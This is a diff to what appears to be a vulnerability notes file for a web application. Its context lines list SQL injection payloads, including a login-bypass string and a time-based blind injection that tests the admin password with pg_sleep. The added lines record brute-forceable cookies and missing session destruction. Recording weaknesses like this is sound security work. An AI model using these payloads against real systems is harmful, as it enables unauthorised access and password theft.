@@ -41,3 +41,8 @@ Try and send a password reset for username `' OR '1'='1`
  SELECT current_database()
 
  test'; SELECT CASE WHEN ((SELECT password from users where username='admin'))='admin1' THEN (select pg_sleep(5)) ELSE NULL END;--
+
+ ## Cookie vulns
+
+ * Current cookie creation does not implement sufficient entropy, thus the cookies are brute forceable 
+ * No current methods for session destruction client/serverside 
